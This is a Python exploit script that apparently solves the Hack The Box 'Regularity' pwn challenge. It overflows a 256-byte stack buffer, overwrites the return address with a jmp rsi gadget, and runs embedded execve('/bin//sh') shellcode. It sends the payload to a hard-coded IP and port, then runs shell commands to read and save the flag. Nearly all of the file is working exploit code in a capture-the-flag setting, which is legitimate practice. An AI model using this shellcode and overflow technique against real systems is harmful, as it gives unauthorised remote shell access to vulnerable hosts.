#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Regularity (HTB TryOut, pwn, very easy) — solver (raw socket, no deps)
=====================================================================
Vuln: read() reads 0x110 (272) bytes into a 0x100 (256) byte buffer -> saved
return address at buffer+0x100 is overwritten (offset 256). Stack is RWE (NX off),
non-PIE, no canary. rsi still points at the buffer after the read syscall, and
`jmp rsi` exists at 0x401041, so overwrite ret with 0x401041 -> jump to our
shellcode at the start of the buffer. No leak required.

Run:  python solve.py 154.57.164.78 31832
"""
import socket, time, struct, sys, re

JMP_RSI = 0x401041
# execve("/bin//sh", NULL, NULL)  (31 bytes)
SC  = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50"
SC += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
PAYLOAD = SC + b"\x90" * (256 - len(SC)) + struct.pack("<Q", JMP_RSI)

def solve(host, port):
    s = socket.create_connection((host, port), timeout=10); s.settimeout(6)
    try: s.recv(1024)          # prompt: "How are you doing today? ..."
    except Exception: pass
    s.sendall(PAYLOAD)         # ret -> jmp rsi -> shellcode
    time.sleep(0.4)
    s.sendall(b"cat flag.txt; cat /flag*; cat flag*; id\n")
    time.sleep(1.0)
    out = b""
    try:
        while True:
            d = s.recv(4096)
            if not d: break
            out += d
            if b"HTB{" in out: break
    except Exception: pass
    print(out.decode("latin1", "replace"))
    m = re.search(r"HTB\{[^}]*\}", out.decode("latin1", "replace"))
    if m:
        open("final_flag.txt", "w").write(m.group(0) + "\n"); print("FLAG:", m.group(0))
    return m.group(0) if m else None

if __name__ == "__main__":
    h, p = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) == 3 else ("154.57.164.78", 31832)
    solve(h, p)
